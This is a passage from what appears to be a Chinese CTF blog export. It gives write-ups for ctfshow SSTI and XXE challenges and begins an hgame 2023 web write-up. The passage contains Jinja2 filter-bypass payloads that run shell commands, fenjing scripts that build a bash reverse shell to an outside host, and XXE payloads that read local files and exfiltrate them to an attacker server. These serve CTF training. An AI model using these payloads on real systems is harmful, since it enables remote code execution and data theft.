class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://478231cf-6cd6-4958-84fd-f3de3b022397.challenge.ctf.show/&#x27;</span></span><br><span class="line"><span class="comment"># target = &quot;__globals__&quot; # (config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()</span></span><br><span class="line"><span class="comment"># target = &quot;os&quot; # (config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()</span></span><br><span class="line">target = <span class="string">&quot;cat /flag&quot;</span> <span class="comment"># (config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> target:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">917</span>):</span><br><span class="line"><span class="comment"># time.sleep(0.1)</span></span><br><span class="line">payload = <span class="string">&quot;&#123;&#123;%print((config|string|list).pop(&#123;&#125;).lower())%&#125;&#125;&quot;</span>.<span class="built_in">format</span>(j)</span><br><span class="line">params = &#123;</span><br><span class="line"><span class="string">&#x27;name&#x27;</span>: payload,</span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url,params=params)</span><br><span class="line">s = re.findall(<span class="string">r&#x27;&lt;h3&gt;(.*)&lt;/h3&gt;&#x27;</span>,response.text)[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># print(j,&quot;==&gt;&quot;,s)</span></span><br><span class="line"><span class="keyword">if</span> i == s:</span><br><span class="line">flag += <span class="string">&quot;(config|string|list).pop(&#123;&#125;).lower()~&quot;</span>.<span class="built_in">format</span>(j)</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag[:-<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用得到的字符构造出最后的<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;%print((lipsum|attr(((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()))).get(((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower())).popen(((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower())).read())%&#125;</span><br></pre></td></tr></table></figure><p>得到替换的字符串也可以先执行下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;%print(config|string|list|lower)%&#125;</span><br></pre></td></tr></table></figure><p>把得到的列表放到<code>l</code>里面即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># target = &quot;__globals__&quot; # (config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()</span></span><br><span class="line"><span class="comment"># target = &quot;os&quot; # (config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()</span></span><br><span class="line">target = <span class="string">&quot;cat /flag&quot;</span> <span class="comment"># (config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()</span></span><br><span class="line">l = </span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> target:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line"><span class="keyword">if</span> i == l[j]:</span><br><span class="line">flag += <span class="string">&quot;(config|string|list).pop(&#123;&#125;).lower()~&quot;</span>.<span class="built_in">format</span>(j)</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag[:-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3 id="方法2-4"><a href="#方法2-4" class="headerlink" title="方法2"></a>方法2</h3><p>替换字符，用<code>join</code>一步步构造出来，最终<code>payload</code>如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%set a=(config|string|list).pop(74)%&#125;&#123;%set globals=(a,a,dict(globals=1)|join,a,a)|join%&#125;&#123;%set init=(a,a,dict(init=1)|join,a,a)|join%&#125;&#123;%set builtins=(a,a,dict(builtins=1)|join,a,a)|join%&#125;&#123;%set a=(lipsum|attr(globals)).get(builtins)%&#125;&#123;%set chr=a.chr%&#125;&#123;%print(a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read())%&#125;</span><br></pre></td></tr></table></figure><p>详细解释下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set a=(config|string|list).pop(74)%&#125;  获得 _</span><br><span class="line"></span><br><span class="line">&#123;%set globals=(a,a,dict(globals=1)|join,a,a)|join%&#125; 获得__globals__</span><br><span class="line"></span><br><span class="line">&#123;%set init=(a,a,dict(init=1)|join,a,a)|join%&#125; 获得__init__</span><br><span class="line"></span><br><span class="line">&#123;%set builtins=(a,a,dict(builtins=1)|join,a,a)|join%&#125; 获得__builtins__</span><br><span class="line"></span><br><span class="line">&#123;%set a=(lipsum|attr(globals)).get(builtins)%&#125; 获得lipsum.__globals__[&#x27;__builtins__&#x27;]</span><br><span class="line"></span><br><span class="line">&#123;%set chr=a.chr%&#125; 获得chr</span><br><span class="line"></span><br><span class="line">&#123;%print(a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read())%&#125;</span><br><span class="line">获得lipsum.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h2><p>过滤了数字</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;%set nummm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set x=(()|select|string|list).pop(num)%&#125;&#123;%set o=dict(o=a,s=b)|join%&#125;&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;&#123;%set builtins=(x,x,dict(builtins=a)|join,x,x)|join%&#125;&#123;%set c=dict(chr=a)|join%&#125;&#123;%set chr=((lipsum|attr(glob)).get(builtins)).get(c)%&#125;&#123;%set cmd=chr(numm)~dict(flag=a)|join%&#125;</span><br><span class="line">&#123;%set cmd=dict(cat=a)|join~chr(nummm)~chr(numm)~dict(flag=a)|join%&#125;&#123;%print((lipsum|attr(glob)).get(o).popen(cmd).read())%&#125;</span><br></pre></td></tr></table></figure><p>解释下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set nummm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125; #32</span><br><span class="line"></span><br><span class="line">&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125; #47</span><br><span class="line"></span><br><span class="line">&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125; #24</span><br><span class="line"></span><br><span class="line">&#123;%set x=(()|select|string|list).pop(num)%&#125; 获得_</span><br><span class="line"></span><br><span class="line">&#123;%set o=dict(o=a,s=b)|join%&#125; 获得os</span><br><span class="line"></span><br><span class="line">&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125; 获得__globals__</span><br><span class="line"></span><br><span class="line">&#123;%set builtins=(x,x,dict(builtins=a)|join,x,x)|join%&#125; 获得__builtins__</span><br><span class="line"></span><br><span class="line">&#123;%set c=dict(chr=a)|join%&#125; 获得字符串chr</span><br><span class="line"></span><br><span class="line">&#123;%set chr=((lipsum|attr(glob)).get(builtins)).get(c)%&#125; 获得chr</span><br><span class="line"></span><br><span class="line">&#123;%set cmd=chr(numm)~dict(flag=a)|join%&#125; 获得/flag</span><br><span class="line"></span><br><span class="line">&#123;%set cmd=dict(cat=a)|join~chr(nummm)~chr(numm)~dict(flag=a)|join%&#125; 获得cat /flag</span><br><span class="line"></span><br><span class="line">&#123;%print((lipsum|attr(glob)).get(o).popen(cmd).read())%&#125; </span><br></pre></td></tr></table></figure><h2 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h2><p>过滤了<code>print</code>，直接反弹shell，<code>payload</code>生成思路和前一题一样，这里介绍一个库<a href="https://pypi.org/project/fenjing/">fenjing</a>，前面的所有题目也可以用这个</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level = logging.WARNING)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>):</span><br><span class="line">    blacklist = [<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;&#123;&#123;&quot;</span>,<span class="string">&quot;&#125;&#125;&quot;</span>,<span class="string">&quot;request&quot;</span>,<span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;print&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这个结果记得要url编码一下</span></span><br><span class="line">payload, _ = exec_cmd_payload(waf, <span class="string">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1\&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># payload, _ = exec_cmd_payload(waf, &quot;cat /flag&quot;) </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"><span class="built_in">print</span>(urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure><h2 id="web372"><a href="#web372" class="headerlink" title="web372"></a>web372</h2><p>又过滤了<code>count</code>，不过没关系，<a href="https://pypi.org/project/fenjing/">fenjing</a>继续一把梭</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level = logging.WARNING)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>):</span><br><span class="line">    blacklist = [<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;&#123;&#123;&quot;</span>,<span class="string">&quot;&#125;&#125;&quot;</span>,<span class="string">&quot;request&quot;</span>,<span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;print&quot;</span>,<span class="string">&quot;count&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这个结果记得要url编码一下</span></span><br><span class="line">payload, _ = exec_cmd_payload(waf, <span class="string">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1\&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># payload, _ = exec_cmd_payload(waf, &quot;cat /flag&quot;) </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"><span class="built_in">print</span>(urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure><blockquote><p>要想手动试一试的话可以使用<code>length</code>来代替<code>count</code>，用全角数字代替半角数字</p><p>具体可以看下这个<a href="https://boogipop.com/2022/10/04/CTFSHOW-SSTI/#Web372-%E8%BF%87%E6%BB%A4count">博客</a></p></blockquote><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure><p>输出的是<code>ctfshow</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">evo1</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">evo1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">evo1</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web374"><a href="#web374" class="headerlink" title="web374"></a>web374</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure><p>没回显，把信息发送到自己的<code>vps</code>上</p><p>首先是<code>evil.dtd</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://your-ip:your-port/?flag=%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure><p>然后是<code>payload</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">aaa</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ip:port/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%aaa;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xxe</span>&gt;</span>1<span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure><p>过滤了<code>&lt;\?xml version=&quot;1\.0&quot;</code>，还是可以用上一关<code>payload</code></p><h2 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure><p>增添了大小写过滤，还是可以用<code>web374</code>的<code>payload</code></p><h2 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure><p>在原来的基础上又过滤了<code>http</code>，设定一个特殊的编码方式（例:UTF-16）转换一下来绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bc5a33d7-d201-47cb-9ca8-65de9691bd9f.challenge.ctf.show/&quot;</span></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % aaa SYSTEM &quot;http://ip:port/evil.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%aaa;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;xxe&gt;1&lt;/xxe&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">requests.post(url ,data=data.encode(<span class="string">&#x27;utf-16&#x27;</span>))</span><br></pre></td></tr></table></figure><p>原来<code>evil.dtd</code>内容不用变</p><h2 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h2><p>登录抓包发现回显<code>username</code>字段，直接构造</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">evo1</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">evo1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">evo1</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame 2023 web题解</title>
      <link href="/2023/02/05/hgame-2023-web-all/"/>
      <url>/2023/02/05/hgame-2023-web-all/</url>
      
        <content type="html"><![CDATA[<h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="Classic-Childhood-Game"><a href="#Classic-Childhood-Game" class="headerlink" title="Classic Childhood Game"></a>Classic Childhood Game</h3><p><a href="http://week-1.hgame.lwsec.cn:30603/Res/Events.js">http://week-1.hgame.lwsec.cn:30603/Res/Events.js</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35&#x27;</span>];</span><br></pre></td></tr></table></figure><p>运行得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ &#x27;YUdkaGJXVjdabFZ1Ym5sS1lYWmhjMk55YVhCMEprWjFibTU1VFRCMFlVYzBiV1Y5&#x27; ]</span><br></pre></td></tr></table></figure><p><code>base64</code>解码两次即可得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;fUnnyJavascript&amp;FunnyM0taG4me&#125;</span><br></pre></td></tr></table></figure><h3 id="Become-A-Member"><a href="#Become-A-Member" class="headerlink" title="Become A Member"></a>Become A Member</h3><p>一步步来就行</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>week-1.hgame.lwsec.cn:32132</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Cute-Bunny</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: 